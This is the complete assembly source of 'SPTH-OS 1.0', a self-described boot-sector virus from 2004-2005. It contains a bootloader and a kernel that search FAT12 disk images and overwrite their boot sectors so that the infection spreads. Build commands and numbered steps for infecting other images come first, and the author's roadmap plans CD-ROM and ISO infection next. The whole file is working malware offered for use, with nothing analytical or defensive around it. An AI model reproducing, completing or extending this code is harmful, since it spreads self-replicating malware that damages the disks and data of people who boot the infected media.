;  SPTH-OS 1.0
;  by Second Part To Hell/[rRlf]
;  www.spth.de.vu
;  spth@priest.com
;  written from November 2004 - January 2005
;  in Austria
;
;  This is, as you can imagine, my first version of my latest project: SPTH-OS 1.0
;  You may wonder why I'm writing an OS... Don't worry, this 'OS' spreads itself :)
;
;  The Virus:
;  SPTH-OS 1.0 is a bootsectorvirus, which works at FAT12 Disks. It spreads
;  itself via infecting other FAT12 .IMG files in the Root_Directory at the
;  Disk.
;
;  FAT12 .IMG file: This is a 1/1 copie of a Disk (A:\) saved in a file.
;                   FAT12 is the only (well 99.999% of all Disks uses it)
;                   File System of a formated Disk.
;
;  The virus is in contrast to most (all?) other 100% OS-independent.
;  Most old bootsectorviruses hook any INT to stay resident in the memory.
;  But my SPTH-OS don't use any INT/API/whatever by the OS, it just uses
;  old, cool BIOS Interrupts. (That's also the reason for naming it 'OS'.)
;
;  The Virus uses it's own FAT12 system driver to find/read/write files at
;  the Disk.
;
;  As you can see that this version is named '1.0', other versions will follow
;  definitivly:
;
;
;  To Do (listed in priority):
;   100%:
;    - FAT32 system driver
;    - .NRB infection   (CD-ROM Bootsector infection)
;    - .ISO infection   (CD-ROM Bootsector infection)
;
;   Maybe (listed in priority):
;    - Infect more than just Root_Directory
;    - NTFS system driver
;    - EXT2 system driver
;
;  You see what I'm going to do next time...
;
;  How to compile:
;- - - - -
;del bootloader.bin
;del kernel.bin
;cls
;fasm bootloader.asm bootloader.bin
;fasm kernel.asm kernel.bin
;del disk-img.img
;copy bootloader.bin+kernel.bin disk-img.img
;rawrite -f disk-img.img -d A -n
;pause
;- - - - -
;
;  How to infect other files:
;- - - - -
;1.) Full-Format a Disk (important because of the Root_Entry)
;2.) Use the compile code above to install the virus on the disk
;3.) Copy some FAT12 .IMG files to the Disk
;4.) Reboot and boot from the infected Disk
;  <-- All FAT12 .IMG files will be infected too. Anybody could RaWrite them to a Disk and next Disk is infected.
;- - - - -
;
;======================== [ bootloader.asm ] ========================
	org 0x7c00
stfat:
 jmp		 start
 nop
 db 0x4D,0x53,0x44,0x4F,0x53,0x35,0x2E,0x30
 db 0x00,0x02,0x01,0x01,0x00,0x02,0xE0,0x00
 db 0x40,0x0B,0xF0,0x09,0x00,0x12,0x00,0x02
 db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
 db 0x00,0x00,0x00,0x29,0x8C,0x22,0x2F,0x7C
 db 0x4E,0x4F,0x20,0x4E,0x41,0x4D,0x45,0x20
 db 0x20,0x20,0x20,0x46,0x41,0x54,0x31,0x32
 db 0x20,0x20,0x20


start:
	cli
	mov	ax,0x9000
	mov	ss, ax
	mov	sp, 0
	sti

	mov	[bootdrv], dl

loada:
	push	ds
	mov	ax, 0
	mov	dl, [bootdrv]
	int	0x13
	pop	ds
	jc	loada


load1:
	mov	ax, 0x1000
	mov	es, ax
	mov	bx, 0
	mov	ah, 0x2
	mov	al, 0x1
	mov	cx, 2
	mov	dx, 0
	int	0x13
	jc	load1

	mov	ax, 0x1000
	mov	es, ax
	mov	ds, ax
	push	ax
	mov	ax, 0
	push	ax
	retf

	bootdrv db 0

ende:
	times (512-(ende-stfat)-2) db 0
	dw 0xAA55
;======================== [ bootloader.asm ] ========================







;========================== [ kernel.asm ] ==========================
start:
;;;;;;;;;;;;;;; Read Root_Directory ;;;;;;;;;;;;;;;

	mov	ax, 0x2000	; ax=0x2000
	mov	es, ax		; Data will be read to ES:BX, ES=0x2000
	mov	ds, ax
	xor	bx, bx		; BX=0x0

loadk:
	mov	ah, 0x2 	; ah=2: Read Sectors
	mov	al, 0x12	; How many Sectors (18)
	mov	ch, 0		; Cylinder 0
	mov	cl, 1		; Start at sektor 1
	xor	dx, dx		; dx=0
	inc	dh		; Head 1
	int	0x13		; System call
	jc	loadk		; If carry, again

	mov	bx, 0x200	; bx=Offset of 2nd Sector in memory


;;;;;;;;;;;;;;; REAL FILE SEARCH ;;;;;;;;;;;;;;;
fat12read:
	mov	ah, [bx]	; ah=First byte of Filename
	cmp	ah, 0x0 	; Check if zero. If zero, it's the last entry
	je	endfat12read	; If End, stopp reading
	cmp	ah, 0xE5	; Check if the byte is 0xE5. If so, it's a deleted file
	je	fat12next	; If deleted file, get next entry

	mov	al, [bx+2]	; al=3rd letter of name
	test	al, al		; Check if zero
	jz 	fat12next	; If zero, get next entry

;;;;;;;;;;;;;;; IMG FILE SEARCH ;;;;;;;;;;;;;;;

	mov	ax, word [bx+8]		; 9th and 10th Letter to ax
	cmp	ax, 'IM'		; Check if it's 'IM'
	jne	fat12next		; If not, no IMG file
	mov	al, byte [bx+10]	; Move 10th letter to al
	cmp	al, 'G'			; Check if 10th letter='G'
	jne	fat12next		; If not, next file

;;;;;;;;;;;;;;; Size Check ( > 2 Sectors = 1024 bytes)  and DIRECTORY ;;;;;;;;;;;;;;;


	mov	ax, word [bx+30]	; Move second (high) word of filesize to ax
	test	ax, ax			; Check if zero
	jnz	fat12sizeok		; If not zero, file has at least 128 sectors

	mov	al, byte [bx+29]	; Move second byte of low word of filesize to ax
	cmp	al, 4			; Compair with 4
	jl	fat12next		; If less than 4, file has not 2 sectors=too small for infection

	mov	al, byte [bx+11]	; Move attribute byte to al
	and	al, 0x10		; ???1 ???? = Directory
	test	al, al			; Check if zero
	jnz	fat12next		; If not zero, it's a directory and we ignore it

;;;;;;;;;;;;;;; Check FAT12 / Modiefy 1st Sector ;;;;;;;;;;;;;;;

fat12sizeok:
	mov	ax, word [bx+25]	; normally: 'mov ax, word [bx+26]' but that stupid shit did...
	xchg	al, ah			; ...not work, I dont know why and I dont want to know why. I spent...
	mov	ah, byte [bx+27]	; ...hours of testing, but no result. Let's never ever talk again about that lines, ok?

	add	ax, 32			; Now we have the real 1st data-sector of the file at the disk

	xor	cx, cx			; ch will be the number of the Cylinder
					; cl will be the number of the Sector
	xor	dx, dx			; dh will be the number of the Head
	call	CyHeSe			; Get the Cylinder, Head and Sector

	push	bx			; Save bx at stack

	mov	bx, 0x3000		; ax=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	mov	bx, 0			; BX=0x0

	mov	ah, 0x2 		; AH=2: Read Sector
	mov	al, 0x1 		; Wir read 1 Sector
	mov	dl, 0
	int	0x13			; Interrupt 13

	mov	ax, word [bx+54]	; For FAT12 it should be 'FA'
	cmp	ax, 'FA'		; Check if 'FA'
	jne	fat12next		; If not, get next file

	mov	ax, word [bx+57]	; For FAT12 it should be '12'
	cmp	ax, '12'		; Check if '12'
	jne	fat12next		; If not, get next file

	xor	di, di			; di=0
	mov	ax, 0xEB3C		; ax=2 bytes of jmp over fat12
	stosw				; Store AX at address ES:DI
	mov	al, 0x90		; al = NOP
	stosb				; Store AL at address ES:DI

	mov	ax, 0x1000		; AX=0x2000
	mov	ds, ax			; DS=0x2000
	mov	cx, 63			; Length of 1st sector data
	mov	si, data1stsector	; Where the data is
	mov	di, 0x3E		; The FAT12 at 1st sector in IMG file
	rep	movsb			; Move CX bytes from DS:SI to ES:DI
					; Move 63 bytes from 0x1000:data1stsector to 0x3000:0x3E

	pop	bx			; Get bx again
	push	bx			; Save it again


	mov	ax, 0x2000		; ax=0x2000
	mov	es, ax			; Data will be read to ES:BX, ES=0x2000
	mov	ds, ax

	mov	ax, word [bx+25]	; normally: 'mov ax, word [bx+26]' but that stupid shit did...
	xchg	al, ah			; ...not work, I dont know why and I dont want to know why. I spent...
	mov	ah, byte [bx+27]	; ...hours of testing, but no result. Let's never ever talk again about that lines, ok?

	add	ax, 32			; Now we have the real 1st data-sector of the file at the disk

	xor	cx, cx			; ch will be the number of the Cylinder
					; cl will be the number of the Sector
	xor	dx, dx			; dh will be the number of the Head
	call	CyHeSe			; Get the Cylinder, Head and Sector

	mov	ax, 0x3000		; ax=0x3000
	mov	es, ax			; Data will be read to ES:BX, ES=0x3000
	mov	ds, ax
	xor	bx, bx			; BX=0

	mov	ah, 0x3 		; AH=3: Write Sector
	mov	al, 0x1 		; Wir read 1 Sector
	mov	dl, 0
	int	0x13			; Interrupt 13

	mov	bx, 0x2000		; ax=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx

	pop	bx			; Restore bx

	jmp	fat12ow2sec		; Jmp over data


;;;;;;;;;;;;;;; 1st Sector Data ;;;;;;;;;;;;;;;
;	jmpoverfat12	db 0xEB,0x3C,0x90	; Jmp over FAT12 at 0x0 in Sector 1
	
	data1stsector	db 0xFA,0xB8,0x00,0x90,0x8E,0xD0,0xBC,0x00,0x00,0xFB	; This is the data after
			db 0x88,0x16,0x7C,0x7C,0x1E,0xB8,0x00,0x00,0x8A,0x16	; the FAT12. Starts at
			db 0x7C,0x7C,0xCD,0x13,0x1F,0x72,0xF3,0xB8,0x00,0x10	; offset 0x3E (62) and
			db 0x8E,0xC0,0xBB,0x00,0x00,0xB4,0x02,0xB0,0x01,0xB9	; has 63 byte.
			db 0x02,0x00,0xBA,0x00,0x00,0xCD,0x13,0x72,0xEA,0xB8
			db 0x00,0x10,0x8E,0xC0,0x8E,0xD8,0x50,0xB8,0x00,0x00
			db 0x50,0xCB,0x00
;;;;;;;;;;;;;;; Overwrite 2nd Sector ;;;;;;;;;;;;;;;
fat12ow2sec:
	mov	ax, word [bx+25]	; normally: 'mov ax, word [bx+26]' but that stupid shit did...
	xchg	al, ah			; ...not work, I dont know why and I dont want to know why. I spent
	mov	ah, byte [bx+27]	; hours of testing, but no result. Let's never ever talk again about that lines, ok?

	add	ax, 32+1		; Now we have the real 2nd data-sector of the file at the disk

	xor	cx, cx			; ch will be the number of the Cylinder
					; cl will be the number of the Sector
	xor	dx, dx			; dh will be the number of the Head
	call	CyHeSe			; Get the Cylinder, Head and Sector

	push	bx			; Save bx at stack, because it will be changed

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	mov	bx, 0			; BX=0x0

	mov	ah, 0x3 		; AH=3: Write sector(s)
	mov	al, 0x1 		; We write 1 sector
	mov	dl, 0
	int	0x13			; Interrupt 13

	mov	bx, 0x2000		; bx=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx

	pop	bx			; Restore bx

;;;;;;;;;;;;;;; Get Next Entry ;;;;;;;;;;;;;;;

fat12next:
	mov	cx, 0x2000		; cx=0x2000
	mov	es, cx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, cx

	add	bx, 0x20		; Next entry
	jmp  fat12read

endfat12read:

	mov	ax, 0x1000		; Restore ES and DS, because now we work again at 0x1000 in memory
	mov	es, ax
	mov	ds, ax

	mov	cx, 0xFFFF		; cx=0xFFFF - Stringlength (not real - stops at 0x0)
	mov	si, msg 		; si=Offset of String
	call	putstr			; Print String to Screen
	mov	cx, 0xFFFF		; Again...
	mov	si, m_boot		; Again...
	call	putstr			; Again
	call	getkey			; Call GetKey function
	jmp	reboot			; Now let's reboot!

	msg	db 'Thank you for using SPTH-OS 1.0',0	; String 1
	m_boot	db 'Press any key...',0 		; String 2

putstr:					; Print String to Screen
	lodsb				; [si]->al
	or al, al			; Check if al=0x0 (=end)
	jz putstrd 			; If end of string, let's stop this loop
	mov	ah, 0xE 		; ah=0xE: Print Letter to Screen
	mov	bx, 0x7
	int	0x10			; call
	loop	putstr			; Next Letter
putstrd:
	mov	al, 13			; Write ASCII 13
	mov	ah, 0xE
	mov	bx, 0x7
	int	0x10

	mov	al, 10			; Write ASCII 10 (13,10=... you know!)
	mov	ah, 0xE
	mov	bx, 0x7
	int	0x10
	retn

   BefCyHeSe:					; Cylinder Increasing
	sub	ax, 36				; al-=36
	inc	ch				; Cylinder++

CyHeSe:
	cmp	ax, 36				; 36 Sectors = 1 Cylinder
	jge	BefCyHeSe			; If greater or equal, jmp to BefCyHeSe

	cmp	ax, 18				; 18 Sectors = Head1
	jl	SecCheck			; If less, Head=0
	mov	dh, 1				; Head++
	sub	ax, 18				; Sectors-=18
   SecCheck:
	mov	cl, al				; cl=Rest Sector Numbers
ret


change_memory:
	pop	ax
	mov	es, ax
	mov	ds, ax
ret

getkey:
	mov	ah, 0			; ah=0: Get Key BIOS Function
	int	0x16			; Call
	ret

reboot:
	db 	0xEA			; Hexdump for reboot: jmp 00FF:FF00
	dw 	0x0
	dw 	0xFFFF
========================== [ kernel.asm ] ==========================